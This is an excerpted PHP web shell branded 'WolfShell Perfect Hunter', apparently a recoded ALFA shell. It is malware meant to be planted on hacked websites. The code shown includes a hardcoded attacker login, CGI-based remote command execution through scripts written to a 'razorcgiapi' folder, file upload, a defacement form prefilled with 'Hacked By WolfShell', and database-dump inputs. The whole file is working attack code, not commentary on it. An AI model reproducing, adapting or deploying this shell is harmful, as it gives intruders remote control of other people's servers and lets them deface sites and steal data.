...
$GLOBALS['WolfShell'] = array(
    'username' => 'haxor',
    'password' => '96b155b4ad7fe62c039c196d2ba38c6f',
    'safe_mode' => '0',
    'login_page' => 'gui',
    'show_icons' => '1',
...
$GLOBALS['DB_NAME'] = $GLOBALS['WolfShell'];
...
define("__ALFA_DATA_FOLDER__", "WOLFSHELL");
...
<center><img style="border-radius:100px;"width="500" height="250" alt="WolfShell Perfect Hunter" draggable="false" src="https://pub-36d33425498c4ee6b5bf58d8dc166c1c.r2.dev/wolf.png" /></center>
<div id=loginbox><p><font face="DejaVu Sans" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="gold"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="black" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="Georgia"><b>WolfShell Perfect Hunter</b></font></th></tr>
...
function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	if(isset($_COOKIE["razorcgiapi_mode"])){
		return "";
	}
	$cmd_pure = $cmd;
	...
	if($is_curl||$is_socket){
		$recreate = false;
		if(isset($_COOKIE["razorcgiapi"])){
			if(!@file_exists("razorcgiapi/".$_COOKIE["razorcgiapi"].".haxor")){
				$recreate = true;
				$lang = $_COOKIE["razorcgiapi"];
			}
		}
		if(!isset($_COOKIE["razorcgiapi"])||$recreate){
			...
			alfacgihtaccess('cgi', "razorcgiapi/");
		}else{
			$lang = $_COOKIE["razorcgiapi"];
		}
		$cgi_ext = ".haxor";
		...
		$cgi_url = __ALFA_DATA_FOLDER__."/razorcgiapi/".$lang.$cgi_ext;
		...
		if(strpos($data, "[solevisible~api]") !== false && strpos($data, '[solevisible~api]<pre>"+output+"</pre>') === false){
			if($set_cookie){
				__alfa_set_cookie("razorcgiapi", $lang);
			}
			...
			if($set_cookie){
				__alfa_set_cookie("razorcgiapi_mode", "off");
			}
		}
		return trim($out);
	}else{
...
echo '<html>';
echo "<title>WolfShell Perfect Hunter Hidden Shell</title>";
...
<title>..:: '.$_SERVER['HTTP_HOST'].' ~ WolfShell Perfect Hunter ::..</title>
<style type="text/css">';?>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="lph team 2023" draggable="false" src="https://pub-071ea67114a54cc3a1d68875afee380f.r2.dev/wolfshell.gif" /></td>
</tr>
<tr>
...
function __showicon($r){
	$s['btn']='https://barujadi.pro/mr.a168/heads.png';
	$s['alfamini']='https://barujadi.pro/mr.a168/heads.png';
...
if(empty($about_us)){
$about_us = "<pre><center><img src='https://pub-36d33425498c4ee6b5bf58d8dc166c1c.r2.dev/wolf.png'><br>
<font color='#FFFFFF'>Shell ReCoded By WolfShell (LPH TEAM)</font><br>
<font color='#00A220'>Contact : WolfShell_Hunternew.com</font><br>
...
function alfacheckupdate(){
	if($GLOBALS["DB_NAME"]["cgi_api"]){
		if(!isset($_COOKIE["razorcgiapi_mode"])&&!isset($_COOKIE["razorcgiapi"])){
...
function alfaWriteTocgiapi($name, $source){
	...
	@mkdir('razorcgiapi',0755);
	__write_file("razorcgiapi/".$name, __get_resource($source));
	@chmod("razorcgiapi/".$name, 0755);
	return $temp;
}
...
function alfaupdateheader(){
	if(!isset($_COOKIE["updateheader_data"])){
		...
		$data = alfaEx("cd '{$tmp_path}/razorcgiapi';sh getheader.haxor",false,true,true);
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ WolfShell &copy; 2023-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"HACKED BY WOLFSHELL\");' style='color: #E91E63;text-decoration: none;'>Contact Me at</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>WolfShell_Hunternew.com</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://t.me/xzjerry'>@alivosreal</a></span></div></td>
</tr>
</table>
</div>
...
if($dirContent === false){
	if(_alfa_can_runCommand(true,true)){
		...
		@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
		if(!isset($_COOKIE["alfachdir_bash"])||@!file_exists($tmp_getdir_path."/razorcgiapi/getdir.alfa")){
		...
		$dirContent = alfaEx("cd ".$tmp_getdir_path."/razorcgiapi;sh getdir.alfa '".addslashes(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd'])."'");
...
<textarea name=index rows='19' cols='103'><title>Hacked By WolfShell</title><b>Hacked By WolfShell</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['alfa6'])){
$s0levisible="Powered By WolfShell Perfect Hunter";
$dbu = $_POST['alfa6'];
$path = $_POST['alfa5'];
$fname = $_POST['alfa4'];
$dbn = $_POST['alfa7'];
...
<title>Hacked By WolfShell</title><b>Hacked By WolfShell</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
if(isset($_POST['alfa6'])){
...
echo "<div class=header>";
echo "
<center><p><img src=\"https://pub-36d33425498c4ee6b5bf58d8dc166c1c.r2.dev/wolf.png\"></p>";
...
$bash_users  = alfaEx("cd ".$tmp_path."/razorcgiapi;sh basedir.haxor ".$makepwd,false,true,true);
